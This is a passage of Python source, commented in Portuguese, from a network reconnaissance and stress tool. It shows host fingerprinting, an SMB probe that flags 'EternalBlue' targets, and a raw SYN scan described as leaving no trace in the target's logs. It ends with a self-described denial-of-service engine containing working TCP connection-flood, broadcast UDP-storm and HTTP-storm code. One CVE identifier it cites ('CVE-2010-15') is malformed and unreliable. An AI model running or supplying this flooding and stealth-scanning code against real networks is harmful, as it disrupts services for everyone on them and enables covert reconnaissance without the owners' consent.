        if not HAS_SCAPY:
            return {}
        for porta in (80, 443, 22, 8080):
            try:
                pkt = IP(dst=ip)/TCP(dport=porta, flags="S", seq=random.randint(0, 0xFFFFFFFF))
                resp = sr1(pkt, timeout=1, verbose=False)
                if not resp or not resp.haslayer(TCP):
                    continue
                ttl = resp[IP].ttl
                window = resp[TCP].window
                # Palpite simples por TTL+window
                palpite = self._inferir_os_por_ttl(ttl)
                if window in (5840, 14600, 29200, 65535) and ttl <= 64:
                    palpite = "Linux"
                elif window in (8192, 65535) and ttl <= 128:
                    palpite = "Windows"
                elif ttl > 128:
                    palpite = "Network device (Cisco/router)"
                return {"porta": porta, "ttl": ttl, "window": window,
                        "os_palpite": palpite}
            except Exception:
                continue
        return {}

    def _consultar_mdns(self, ip: str) -> str:
        """Envia query mDNS unicast para porta 5353 e tenta extrair nome .local."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1.0)
            # Query DNS-SD: PTR _services._dns-sd._udp.local
            tx_id = b"\x00\x00"
            flags = b"\x00\x00"
            qd = b"\x00\x01"
            an = ar = ns = b"\x00\x00"
            nome = b"\x09_services\x07_dns-sd\x04_udp\x05local\x00"
            qtype = b"\x00\x0c"  # PTR
            qclass = b"\x00\x01"
            pacote = tx_id + flags + qd + an + ns + ar + nome + qtype + qclass
            s.sendto(pacote, (ip, 5353))
            data, _ = s.recvfrom(2048)
            s.close()
            # Heurística: tenta extrair labels ASCII de tamanho prefixado
            extraido = []
            i = 0
            while i < len(data):
                tam = data[i]
                if tam == 0 or tam > 63:
                    i += 1
                    continue
                trecho = data[i+1:i+1+tam]
                if all(32 <= b < 127 for b in trecho):
                    extraido.append(trecho.decode("ascii", errors="ignore"))
                i += 1 + tam
            for tok in extraido:
                if tok.endswith("local") or "." in tok and len(tok) > 3:
                    return tok
            for tok in extraido:
                if 3 < len(tok) < 40 and tok.lower() not in ("services", "dns-sd", "udp", "tcp"):
                    return tok
        except Exception:
            return ""
        return ""

    def _consultar_netbios(self, ip: str) -> str:
        """NBSTAT NodeStatus na UDP/137. Decodifica nome NetBIOS de Windows."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1.0)
            # Pacote NBSTAT mínimo (NodeStatus: nome '*' codificado)
            pacote = (
                b"\x82\x28"             # tx id
                b"\x00\x00"             # flags
                b"\x00\x01\x00\x00\x00\x00\x00\x00"
                b"\x20"                 # length 32
                b"CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  # '*' codificado
                b"\x00"
                b"\x00\x21"             # type NBSTAT
                b"\x00\x01"             # class IN
            )
            s.sendto(pacote, (ip, 137))
            data, _ = s.recvfrom(2048)
            s.close()
            if len(data) < 57:
                return ""
            qtd = data[56]
            inicio = 57
            for n in range(qtd):
                if inicio + 18 > len(data):
                    break
                nome_bruto = data[inicio:inicio+15].decode("ascii", errors="ignore").strip()
                tipo = data[inicio+15]
                flags = data[inicio+16:inicio+18]
                inicio += 18
                # Tipo 0x00 + flag de grupo desligado = nome de máquina
                if tipo == 0x00 and not (flags[0] & 0x80):
                    if nome_bruto and nome_bruto.replace("\x00", "").strip():
                        return nome_bruto.strip()
        except Exception:
            return ""
        return ""

    def _sondar_ssdp(self, ip: str) -> Dict[str, str]:
        """M-SEARCH unicast. Lê headers SERVER/LOCATION/USN."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1.5)
            msg = (
                "M-SEARCH * HTTP/1.1\r\n"
                f"HOST: {ip}:1900\r\n"
                "MAN: \"ssdp:discover\"\r\n"
                "MX: 1\r\n"
                "ST: ssdp:all\r\n\r\n"
            ).encode("utf-8")
            s.sendto(msg, (ip, 1900))
            data, _ = s.recvfrom(2048)
            s.close()
            texto = data.decode("utf-8", errors="ignore")
            meta: Dict[str, str] = {}
            for linha in texto.splitlines():
                if ":" in linha:
                    k, v = linha.split(":", 1)
                    k = k.strip().lower()
                    v = v.strip()
                    if k in ("server", "location", "usn", "st"):
                        meta[k] = v
            return meta
        except Exception:
            return {}

    def _banner_smb(self, ip: str) -> str:
        """Negotiate Protocol mínimo na 445; identifica dialeto SMB."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((ip, 445))
            # Pacote SMB1 NegotiateProtocol com dialetos comuns
            pacote = (
                b"\x00\x00\x00\x85"
                b"\xffSMB"
                b"\x72"                          # NegotiateProtocol
                b"\x00\x00\x00\x00"
                b"\x18\x53\xc8"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00"
                b"\xff\xff"
                b"\x00\x00"
                b"\x00\x00"
                b"\x00\x62"
                b"\x00\x02PC NETWORK PROGRAM 1.0\x00"
                b"\x02LANMAN1.0\x00"
                b"\x02Windows for Workgroups 3.1a\x00"
                b"\x02LM1.2X002\x00"
                b"\x02LANMAN2.1\x00"
                b"\x02NT LM 0.12\x00"
                b"\x02SMB 2.002\x00"
                b"\x02SMB 2.???\x00"
            )
            s.sendall(pacote)
            resp = s.recv(1024)
            s.close()
            if b"SMB 2.???" in resp or resp[4:8] == b"\xfeSMB":
                return "SMB 2.x/3.x"
            if b"NT LM 0.12" in resp:
                return "SMB 1.0 (NT LM 0.12) — vetor EternalBlue"
            return "SMB (dialeto desconhecido)"
        except Exception:
            return ""

    async def _coletar_http(self, ip: str) -> Dict[str, str]:
        """Tenta GET em 80/443/8080 e extrai title/server."""
        if not HAS_AIOHTTP:
            return {}
        portas = [(80, "http"), (8080, "http"), (443, "https"), (8443, "https")]
        for porta, esquema in portas:
            url = f"{esquema}://{ip}:{porta}/"
            try:
                timeout = aiohttp.ClientTimeout(total=2)
                conn = aiohttp.TCPConnector(ssl=False, force_close=True)
                async with aiohttp.ClientSession(timeout=timeout, connector=conn) as ses:
                    async with ses.get(url, ssl=False) as resp:
                        body = await resp.read()
                        texto = body[:4096].decode("utf-8", errors="ignore")
                        m = re.search(r"<title[^>]*>([^<]{1,120})</title>", texto, re.I)
                        title = m.group(1).strip() if m else ""
                        return {
                            "url": url,
                            "status": str(resp.status),
                            "server": resp.headers.get("Server", ""),
                            "title": title,
                            "porta": str(porta),
                        }
            except Exception:
                continue
        return {}

    async def _nmap_os(self, ip: str) -> str:
        """Roda `nmap -O` async se o binário estiver disponível."""
        try:
            cmd = ["nmap", "-O", "-Pn", "--max-retries", "1", "--host-timeout", "8s", ip]
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=12)
            saida = stdout.decode(errors="ignore")
            m = re.search(r"OS details: (.+)", saida)
            if m:
                return m.group(1).strip()[:80]
            m = re.search(r"Running: (.+)", saida)
            if m:
                return m.group(1).strip()[:80]
        except Exception:
            return ""
        return ""

    def _ler_dhcp_leases(self) -> Dict[str, str]:
        """Procura arquivos de lease DHCP comuns e extrai mapa IP→hostname."""
        candidatos = [
            "/data/data/com.termux/files/usr/var/lib/dhcp/dhcpd.leases",
            "/var/lib/dhcp/dhcpd.leases",
            "/var/lib/dhcpd/dhcpd.leases",
            "/tmp/dhcp.leases",
            "/tmp/dnsmasq.leases",
            "/var/lib/misc/dnsmasq.leases",
        ]
        mapa: Dict[str, str] = {}
        for caminho in candidatos:
            try:
                if not os.path.exists(caminho):
                    continue
                with open(caminho, "r", errors="ignore") as f:
                    conteudo = f.read()
                # ISC DHCP: lease 192.168.0.10 { ... client-hostname "name"; }
                for ip, nome in re.findall(
                    r'lease\s+(\d+\.\d+\.\d+\.\d+)\s*\{[^}]*?client-hostname\s+"([^"]+)"',
                    conteudo, re.S):
                    mapa[ip] = nome
                # dnsmasq: timestamp mac ip hostname client-id
                for linha in conteudo.splitlines():
                    partes = linha.split()
                    if len(partes) >= 4 and re.match(r"\d+\.\d+\.\d+\.\d+", partes[2]):
                        if partes[3] not in ("*", ""):
                            mapa[partes[2]] = partes[3]
            except Exception:
                continue
        if mapa:
            self.ui.success(f"DHCP leases: {len(mapa)} hostnames carregados")
        return mapa

    def _classificar_dispositivo(self, host: Dict[str, Any]):
        """Aplica DEVICE_HEURISTICS na ordem; primeiro match vence."""
        portas = set(host.get("ports", []))
        vendor = host.get("vendor", "")
        os_str = host.get("os", "")
        for regra in DEVICE_HEURISTICS:
            if regra.get("is_gateway") and host.get("is_gateway"):
                host["device_type"] = regra["tipo"]
                return
            if "vendor_in" in regra and vendor in regra["vendor_in"]:
                host["device_type"] = regra["tipo"]
                return
            if "porta_qualquer" in regra and portas.intersection(regra["porta_qualquer"]):
                host["device_type"] = regra["tipo"]
                return
            if "ttl_em" in regra:
                if any(k.lower() in os_str.lower() for k in regra["ttl_em"]):
                    host["device_type"] = regra["tipo"]
                    return
        # Fallback usando fingerprints HTTP
        http = host.get("extra", {}).get("http", {})
        servidor = (http.get("server", "") + " " + http.get("title", "")).lower()
        if servidor:
            for fp in DEVICE_FINGERPRINTS:
                if fp["marker"] in servidor:
                    host["device_type"] = fp["tipo"]
                    if host.get("vendor", "Unknown") in ("", "Unknown", "N/A"):
                        host["vendor"] = fp["vendor"]
                    return
        host["device_type"] = "desconhecido"

    def _calcular_confianca(self, host: Dict[str, Any]):
        """Score 0–100 por campo, baseado em quantidade/qualidade de fontes."""
        fontes = set(host.get("fontes", []))
        confiancas: Dict[str, int] = {}
        # hostname
        score_h = 0
        if "dhcp" in fontes: score_h += 50
        if "netbios" in fontes: score_h += 35
        if "mdns" in fontes: score_h += 30
        if "ssdp" in fontes: score_h += 15
        if "http" in fontes: score_h += 10
        confiancas["hostname"] = min(100, score_h) if host.get("hostname") else 0
        # vendor
        score_v = 0
        if "arp" in fontes and host.get("vendor", "Unknown") != "Unknown": score_v += 60
        if "ssdp" in fontes: score_v += 15
        if "http" in fontes: score_v += 15
        if "nmap" in fontes: score_v += 10
        confiancas["vendor"] = min(100, score_v)
        # os
        score_o = 0
        if "nmap" in fontes: score_o += 60
        if "smb" in fontes: score_o += 25
        if "ttl" in fontes: score_o += 25
        confiancas["os"] = min(100, score_o)
        # device_type
        score_d = 0
        if host.get("device_type", "desconhecido") != "desconhecido":
            score_d = 50
            if "ssdp" in fontes or "http" in fontes: score_d += 20
            if host.get("vendor", "Unknown") != "Unknown": score_d += 20
        confiancas["device_type"] = min(100, score_d)
        host["confiancas"] = confiancas

    def _print_results(self):
        if not self.hosts:
            self.ui.warn("Nenhum host ativo encontrado.")
            return
        rows = []
        for h in self.hosts:
            gw = " [GW]" if h["is_gateway"] else ""
            tipo = h.get("device_type", "desconhecido")
            hostname = h.get("hostname", "") or "—"
            confianca_total = sum(h.get("confiancas", {}).values()) // max(1, len(h.get("confiancas", {})))
            rows.append([
                h["ip"] + gw,
                hostname[:24],
                h["mac"],
                h["vendor"],
                h["os"],
                tipo,
                f"{confianca_total}%",
                f"{h['latency_ms']}ms",
            ])
        self.ui.table("Hosts Descobertos (Inteligência Total)",
                       [("IP", C_GREEN), ("Hostname", C_PURPLE), ("MAC", C_CYAN),
                        ("Vendor", C_WHITE), ("OS", C_YELLOW), ("Tipo", C_CYAN),
                        ("Conf.", C_GREEN), ("Latency", C_DIM)], rows)


# ═══════════════════ PORT SCANNER ═════════════════════════════

class PortScanner:
    """Asyncio TCP connect scanner with normal/insane/stealth modes."""

    def __init__(self, ui: TerminalUI, mode: str = "normal",
                 custom_ports: Optional[List[int]] = None, insane: bool = False):
        self.ui = ui
        self.mode = mode
        self.insane = insane
        self.ports = self._resolve_ports(custom_ports)
        self.timeout = self._resolve_timeout()

    def _resolve_ports(self, custom: Optional[List[int]]) -> List[int]:
        if custom:
            return sorted(custom)
        if self.mode == "insane" or self.insane:
            return list(range(1, 65536))
        elif self.mode == "stealth":
            return TOP100_PORTS[:]
        return TOP20_PORTS[:]

    def _resolve_timeout(self) -> float:
        if self.mode == "insane" or self.insane:
            return 0.5
        elif self.mode == "stealth":
            return 3.0
        return SCAN_TIMEOUT

    async def scan_host(self, host: Dict[str, Any]) -> Dict[str, Any]:
        ip = host["ip"]
        open_ports = await self._tcp_scan(ip)
        host["ports"] = open_ports
        if open_ports:
            services = await self._grab_banners(ip, open_ports)
            host["services"] = services
            # Avaliação passiva de vulnerabilidades — só roda em modo Insane
            if self.insane or self.mode == "insane":
                host["vulns"] = await self._avaliar_vulns(host)
                # Emite vulns para o dashboard --live
                for v in host.get("vulns", []):
                    emitir("vuln_found", ip=ip, **v)
            emitir("host_update", **host)
        return host

    async def scan_all(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        mode_label = self.mode.upper()
        if self.insane:
            mode_label += " + INSANE"
        self.ui.section(f"PORT SCAN — {mode_label}")
        emitir("fase", nome=f"SCAN — {mode_label}", indice="2/3")
        self.ui.info(f"Portas: {len(self.ports)} | Timeout: {self.timeout}s | Alvos: {len(hosts)}")

        for host in hosts:
            ip = host["ip"]
            self.ui.info(f"Scanning {ip}...")
            await self.scan_host(host)
            if host["ports"]:
                port_list = ", ".join(str(p) for p in host["ports"][:15])
                extra = f" (+{len(host['ports']) - 15} more)" if len(host["ports"]) > 15 else ""
                self.ui.success(f"{ip}: {len(host['ports'])} portas abertas — {port_list}{extra}")
            else:
                self.ui.warn(f"{ip}: nenhuma porta aberta")

        self._print_summary(hosts)
        return hosts

    async def _tcp_scan(self, ip: str) -> List[int]:
        # Sob --root + scapy, usa SYN raw scan (stealth real, sem 3-way handshake)
        if priv_ativo() and tem_cap("scapy") and self.mode != "stealth":
            self.ui.info(f"  [ROOT] Usando SYN raw scan (scapy) em {ip}")
            try:
                portas = await self._tcp_scan_raw_syn(ip)
                if portas is not None:
                    return portas
            except Exception as e:
                self.ui.warn(f"  SYN raw falhou ({e}); caindo para connect scan.")

        open_ports: List[int] = []
        # Concorrência elevada se --root (kernel libera mais sockets)
        if priv_ativo() and self.mode != "stealth":
            limite = CONCURRENT_LIMIT_ROOT
        elif self.mode == "stealth":
            limite = 50
        else:
            limite = CONCURRENT_LIMIT
        sem = asyncio.Semaphore(limite)

        async def check(port: int):
            async with sem:
                if self.mode == "stealth":
                    await asyncio.sleep(random.uniform(0.05, 0.3))
                try:
                    _, w = await asyncio.wait_for(
                        asyncio.open_connection(ip, port), timeout=self.timeout)
                    w.close()
                    await w.wait_closed()
                    open_ports.append(port)
                except Exception:
                    pass

        progress = self.ui.progress(f"Scanning {ip}")
        if progress and len(self.ports) > 100:
            with progress:
                task = progress.add_task(f"{ip}", total=len(self.ports))
                # Batch maior se --root para saturar a concorrência elevada
                if self.mode == "stealth":
                    batch = 25
                elif priv_ativo():
                    batch = 1024
                else:
                    batch = 500
                for i in range(0, len(self.ports), batch):
                    chunk = self.ports[i:i + batch]
                    await asyncio.gather(*[check(p) for p in chunk])
                    progress.update(task, advance=len(chunk))
                    # Thermal guard em Termux
                    if priv_ativo() and ctx_priv and ctx_priv.motor == "root-termux":
                        t = temperatura_cpu()
                        if t >= THERMAL_LIMITE_ABORTAR:
                            self.ui.error(f"  Temp {t:.1f}°C — abortando scan.")
                            break
                        elif t >= THERMAL_LIMITE_REDUZIR and limite > 256:
                            self.ui.warn(f"  Temp {t:.1f}°C — reduzindo concorrência.")
                            sem = asyncio.Semaphore(256)
                            limite = 256
        else:
            await asyncio.gather(*[check(p) for p in self.ports])

        return sorted(open_ports)

    async def _tcp_scan_raw_syn(self, ip: str) -> Optional[List[int]]:
        """SYN scan stealth via scapy. Half-open: envia SYN, lê SYN/ACK,
        responde RST. Não loga em syslog do alvo. Roda em executor."""
        if not HAS_SCAPY:
            return None
        loop = asyncio.get_event_loop()

        def _scan_chunk(portas: List[int]) -> List[int]:
            abertas: List[int] = []
            try:
                # sr (multi) com timeout curto; processa em chunks pra evitar memória
                pkts = [IP(dst=ip)/TCP(dport=p, flags="S",
                        seq=random.randint(0, 0xFFFFFFFF)) for p in portas]
                from scapy.all import sr  # import local (já em try-import global)
                ans, _ = sr(pkts, timeout=2, verbose=False, retry=0)
                for snd, rcv in ans:
                    if rcv.haslayer(TCP) and (rcv[TCP].flags & 0x12) == 0x12:  # SYN+ACK
                        abertas.append(snd[TCP].dport)
                        # Envia RST para fechar limpo
                        try:
                            send(IP(dst=ip)/TCP(dport=snd[TCP].dport,
                                                flags="R", seq=rcv[TCP].ack),
                                 verbose=False)
                        except Exception:
                            pass
            except PermissionError:
                return None  # type: ignore
            except Exception:
                pass
            return abertas

        abertas: List[int] = []
        # Quebra em chunks de 1024 portas para não estourar memória
        for i in range(0, len(self.ports), 1024):
            chunk = self.ports[i:i + 1024]
            try:
                res = await loop.run_in_executor(None, _scan_chunk, chunk)
                if res is None:
                    return None
                abertas.extend(res)
            except Exception:
                continue
            # Thermal guard em Termux
            if ctx_priv and ctx_priv.motor == "root-termux":
                if temperatura_cpu() >= THERMAL_LIMITE_ABORTAR:
                    self.ui.error("  Temp crítica — abortando SYN scan.")
                    break
        return sorted(set(abertas))

    async def _grab_banners(self, ip: str, ports: List[int]) -> Dict[int, Dict]:
        services: Dict[int, Dict] = {}
        sem = asyncio.Semaphore(50)

        async def grab(port: int):
            async with sem:
                svc = SERVICE_MAP.get(port, "unknown")
                banner = ""
                try:
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(ip, port), timeout=BANNER_TIMEOUT)
                    if port in (80, 443, 8080, 8443, 8000, 8888, 8081):
                        w.write(f"GET / HTTP/1.0\r\nHost: {ip}\r\n\r\n".encode())
                        await w.drain()
                    data = await asyncio.wait_for(r.read(1024), timeout=BANNER_TIMEOUT)
                    banner = data.decode(errors="ignore").strip()[:200]
                    w.close()
                    await w.wait_closed()
                except Exception:
                    pass
                svc_name = self._identify_service(port, banner, svc)
                services[port] = {"service": svc_name, "banner": banner}

        await asyncio.gather(*[grab(p) for p in ports[:100]])
        return services

    def _identify_service(self, port: int, banner: str, default: str) -> str:
        bl = banner.lower()
        if "ssh" in bl:
            return "ssh"
        if "ftp" in bl:
            return "ftp"
        if "http" in bl or "html" in bl:
            return "http"
        if "smtp" in bl:
            return "smtp"
        if "mysql" in bl:
            return "mysql"
        if "postgresql" in bl:
            return "postgresql"
        if "redis" in bl:
            return "redis"
        if "mongodb" in bl:
            return "mongodb"
        if "telnet" in bl:
            return "telnet"
        if port in IOT_PORTS:
            return f"iot/{default}"
        return default

    # ─── Camada de Avaliação de Vulnerabilidades (passivo) ──────

    async def _avaliar_vulns(self, host: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Para cada porta aberta: cruza com VULN_DB + verificações leves
        (headers HTTP, versão SSH, banner FTP/Telnet). Sem exploit."""
        achados: List[Dict[str, Any]] = []
        ip = host["ip"]
        servicos = host.get("services", {})
        for porta in host.get("ports", []):
            banner = servicos.get(porta, {}).get("banner", "") or ""
            for assinatura in VULN_DB.get(porta, []):
                try:
                    if re.search(assinatura["regex"], banner):
                        achados.append({
                            "porta": porta,
                            "servico": assinatura["servico"],
                            "dica_cve": assinatura["dica"],
                            "severidade": assinatura["severidade"],
                            "verificada": False,
                        })
                except re.error:
                    continue
            # Checagens dinâmicas
            if porta in (80, 443, 8080, 8443, 8000, 8888) and HAS_AIOHTTP:
                achado_h = await self._auditar_headers_http(ip, porta)
                achados.extend(achado_h)
            if porta == 22:
                vss = self._verificar_ssh_versao(banner)
                if vss:
                    achados.append(vss)
            if porta in (21, 23):
                vbn = self._telnet_ftp_banner(porta, banner)
                if vbn:
                    achados.append(vbn)
        # Dedup por (porta, dica)
        unicos = []
        chaves = set()
        for a in achados:
            k = (a["porta"], a["dica_cve"])
            if k in chaves:
                continue
            chaves.add(k)
            unicos.append(a)
        return unicos

    async def _auditar_headers_http(self, ip: str, porta: int) -> List[Dict[str, Any]]:
        """Audita ausência de headers de segurança em respostas HTTP."""
        if not HAS_AIOHTTP:
            return []
        esquema = "https" if porta in (443, 8443) else "http"
        url = f"{esquema}://{ip}:{porta}/"
        achados: List[Dict[str, Any]] = []
        cabecalhos_esperados = [
            "X-Frame-Options", "Content-Security-Policy",
            "Strict-Transport-Security", "X-Content-Type-Options",
            "Referrer-Policy",
        ]
        try:
            timeout = aiohttp.ClientTimeout(total=2)
            conn = aiohttp.TCPConnector(ssl=False, force_close=True)
            async with aiohttp.ClientSession(timeout=timeout, connector=conn) as ses:
                async with ses.get(url, ssl=False) as resp:
                    headers_lower = {k.lower(): v for k, v in resp.headers.items()}
                    ausentes = [h for h in cabecalhos_esperados if h.lower() not in headers_lower]
                    if ausentes:
                        achados.append({
                            "porta": porta,
                            "servico": "http",
                            "dica_cve": "Headers de segurança ausentes: " + ", ".join(ausentes),
                            "severidade": "media" if len(ausentes) >= 3 else "info",
                            "verificada": True,
                        })
                    # Fingerprint Server header contra versões antigas
                    server = headers_lower.get("server", "")
                    if re.search(r"Apache/(1\.|2\.0|2\.2)", server):
                        achados.append({"porta": porta, "servico": "http",
                                        "dica_cve": f"Servidor desatualizado: {server}",
                                        "severidade": "alta", "verificada": True})
                    elif re.search(r"Microsoft-IIS/[5-7]", server):
                        achados.append({"porta": porta, "servico": "http",
                                        "dica_cve": f"IIS legado: {server}",
                                        "severidade": "alta", "verificada": True})
                    # Cookies de sessão default
                    set_cookie = headers_lower.get("set-cookie", "")
                    if re.search(r"(sessionid=admin|auth=0|admin=true)", set_cookie, re.I):
                        achados.append({"porta": porta, "servico": "http",
                                        "dica_cve": "Cookie de sessão suspeito (default/admin)",
                                        "severidade": "alta", "verificada": True})
        except Exception:
            return []
        return achados

    def _verificar_ssh_versao(self, banner: str) -> Optional[Dict[str, Any]]:
        m = re.search(r"OpenSSH_(\d+)\.(\d+)", banner)
        if not m:
            return None
        major, minor = int(m.group(1)), int(m.group(2))
        if (major, minor) < (7, 7):
            return {"porta": 22, "servico": "ssh",
                    "dica_cve": f"OpenSSH {major}.{minor} — user enumeration (CVE-2018-15473)",
                    "severidade": "alta", "verificada": True}
        if (major, minor) < (8, 5):
            return {"porta": 22, "servico": "ssh",
                    "dica_cve": f"OpenSSH {major}.{minor} — múltiplos CVEs corrigidos em 8.5+",
                    "severidade": "media", "verificada": True}
        return None

    def _telnet_ftp_banner(self, porta: int, banner: str) -> Optional[Dict[str, Any]]:
        if not banner:
            return None
        if porta == 23:
            return {"porta": 23, "servico": "telnet",
                    "dica_cve": f"Telnet exposto (banner: {banner[:60]})",
                    "severidade": "alta", "verificada": True}
        if porta == 21:
            if re.search(r"ProFTPD\s*1\.3\.3c", banner):
                return {"porta": 21, "servico": "ftp",
                        "dica_cve": "ProFTPD 1.3.3c backdoor (CVE-2010-15)",
                        "severidade": "critica", "verificada": True}
            if re.search(r"vsftpd\s*2\.3\.4", banner):
                return {"porta": 21, "servico": "ftp",
                        "dica_cve": "vsftpd 2.3.4 backdoor (CVE-2011-2523)",
                        "severidade": "critica", "verificada": True}
        return None

    def _print_summary(self, hosts: List[Dict[str, Any]]):
        rows = []
        for h in hosts:
            if not h["ports"]:
                continue
            for port in h["ports"][:20]:
                svc = h["services"].get(port, {})
                banner_short = svc.get("banner", "")[:60].replace("\n", " ")
                rows.append([
                    h["ip"], str(port),
                    svc.get("service", SERVICE_MAP.get(port, "?")),
                    banner_short or "—",
                ])
        if rows:
            self.ui.table("Serviços Detectados",
                           [("Host", C_GREEN), ("Port", C_CYAN),
                            ("Service", C_YELLOW), ("Banner", C_DIM)], rows)
        # Tabela de vulnerabilidades (modo Insane)
        if self.insane or self.mode == "insane":
            vrows = []
            for h in hosts:
                for v in h.get("vulns", []) or []:
                    vrows.append([
                        h["ip"], str(v.get("porta", "?")),
                        v.get("servico", "?"),
                        v.get("severidade", "info").upper(),
                        v.get("dica_cve", "")[:80],
                    ])
            if vrows:
                self.ui.table("Vulnerabilidades Identificadas (Insane)",
                               [("Host", C_GREEN), ("Port", C_CYAN),
                                ("Serviço", C_YELLOW), ("Severidade", C_RED),
                                ("Dica/CVE", C_WHITE)], vrows)


# ══════════════════ STRESS ENGINE ═════════════════════════════

class LatencyMonitor:
    """Parallel ping monitor during stress tests."""

    def __init__(self, gateway: str, ui: TerminalUI):
        self.gateway = gateway
        self.ui = ui
        self.running = False
        self.samples: List[Tuple[float, float]] = []
        self.baseline: float = 0.0
        self._thread: Optional[threading.Thread] = None

    def start(self):
        self.running = True
        self._measure_baseline()
        self._thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._thread.start()

    def stop(self) -> Dict[str, Any]:
        self.running = False
        if self._thread:
            self._thread.join(timeout=3)
        latencies = [s[1] for s in self.samples if s[1] >= 0]
        if not latencies:
            return {"baseline_ms": self.baseline, "avg_ms": 0, "max_ms": 0,
                    "min_ms": 0, "packet_loss_pct": 100, "samples": 0}
        total = len(self.samples)
        lost = sum(1 for s in self.samples if s[1] < 0)
        return {
            "baseline_ms": round(self.baseline, 2),
            "avg_ms": round(sum(latencies) / len(latencies), 2),
            "max_ms": round(max(latencies), 2),
            "min_ms": round(min(latencies), 2),
            "packet_loss_pct": round(lost / total * 100, 1) if total else 0,
            "samples": total,
        }

    def _measure_baseline(self):
        samples = []
        for _ in range(3):
            lat = self._ping_once()
            if lat >= 0:
                samples.append(lat)
        self.baseline = sum(samples) / len(samples) if samples else 0

    def _monitor_loop(self):
        while self.running:
            ts = time.time()
            lat = self._ping_once()
            self.samples.append((ts, lat))
            time.sleep(0.5)

    def _ping_once(self) -> float:
        try:
            cmd = (["ping", "-n", "1", "-w", "1000", self.gateway]
                   if IS_WINDOWS else
                   ["ping", "-c", "1", "-W", "1", self.gateway])
            out = subprocess.check_output(
                cmd,
                text=True, timeout=3, stderr=subprocess.DEVNULL)
            m = re.search(r"time[=<]\s*([\d.]+)", out)
            return float(m.group(1)) if m else -1
        except Exception:
            return -1


class StressEngine:
    """Stress consolidado: TUDO de DOS vive em --godfall.
    Helpers internos (TCP flood, UDP storm, HTTP storm, iperf3) são usados
    como vetores dentro das fases. Modo --infinite ativa TITANFALL eterna."""

    def __init__(self, ui: TerminalUI, detector: NetworkDetector,
                 insane: bool = False, infinito: bool = False):
        self.ui = ui
        self.det = detector
        self.insane = insane
        self.infinito = infinito
        self.results: Dict[str, Any] = {}

    async def _tcp_flood(self, target: str):
        self.ui.info("TCP Connection Flood iniciando...")
        levels = [100, 250, 500, 1000] if not self.insane else [200, 500, 1000, 2000, 5000]
        port = 80

        for count in levels:
            self.ui.info(f"  Nível: {count} conexões simultâneas...")
            conns = []
            start = time.time()
            try:
                for _ in range(count):
                    try:
                        r, w = await asyncio.wait_for(
                            asyncio.open_connection(target, port), timeout=2)
                        conns.append(w)
                    except Exception:
                        break
                elapsed = time.time() - start
                self.ui.success(f"  {len(conns)}/{count} conexões em {elapsed:.2f}s")
                await asyncio.sleep(2)
            finally:
                for w in conns:
                    try:
                        w.close()
                    except Exception:
                        pass

    async def _udp_storm(self, target: str):
        self.ui.info("UDP Storm iniciando...")
        subnet = self.det.subnet
        broadcast = str(ipaddress.ip_network(subnet, strict=False).broadcast_address) if subnet else target
        payload = os.urandom(65507)
        duration = min(30, STRESS_MAX_DURATION) if not self.insane else min(60, STRESS_MAX_DURATION)
        sent = 0
        start = time.time()

        def storm():
            nonlocal sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            while time.time() - start < duration:
                try:
                    for port in [9, 7, 1900, 5353, 137]:
                        sock.sendto(payload, (broadcast, port))
                        sent += 1
                except Exception:
                    break
            sock.close()

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, storm)
        self.ui.success(f"UDP Storm: {sent} pacotes enviados em {time.time() - start:.1f}s")

    async def _http_storm(self, target: str):
        if not HAS_AIOHTTP:
            self.ui.warn("aiohttp não disponível — HTTP storm ignorado")
            return
        self.ui.info("HTTP Storm iniciando...")
        url = f"http://{target}/"
        levels = [50, 100, 200] if not self.insane else [100, 300, 500, 1000]
        for count in levels:
            success = 0
            errors = 0
            start = time.time()
            connector = aiohttp.TCPConnector(limit=count, force_close=True)
            try:
                async with aiohttp.ClientSession(connector=connector) as session:
                    tasks = []
                    for _ in range(count):
                        tasks.append(self._http_req(session, url))
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for r in results:
                        if isinstance(r, Exception):
                            errors += 1
                        else:
                            success += 1
            except Exception:
                errors = count
            elapsed = time.time() - start
            self.ui.info(f"  {count} reqs: {success} OK / {errors} fail em {elapsed:.2f}s")
            await asyncio.sleep(1)

    async def _http_req(self, session, url: str):
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            await resp.read()
            return resp.status

    async def _run_iperf(self, target: str, udp: bool):
        cmd = ["iperf3", "-c", target, "-t", "10", "-J"]
        if udp:
            cmd.extend(["-u", "-b", "100M"])
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
            out = stdout.decode(errors="ignore")
            try:
                data = json.loads(out)
                end = data.get("end", {})
                if udp:
                    stream = end.get("sum", {})
                    self.ui.success(f"  UDP: {stream.get('bits_per_second', 0) / 1e6:.1f} Mbps | "
                                    f"Jitter: {stream.get('jitter_ms', 0):.2f}ms | "
                                    f"Loss: {stream.get('lost_percent', 0):.1f}%")
                else:
                    sent = end.get("sum_sent", {})
                    recv = end.get("sum_received", {})
                    self.ui.success(f"  TCP TX: {sent.get('bits_per_second', 0) / 1e6:.1f} Mbps | "
                                    f"RX: {recv.get('bits_per_second', 0) / 1e6:.1f} Mbps")
                self.results[f"iperf_{'udp' if udp else 'tcp'}"] = end
            except json.JSONDecodeError:
                self.ui.warn(f"  iperf3 output não-JSON: {out[:100]}")
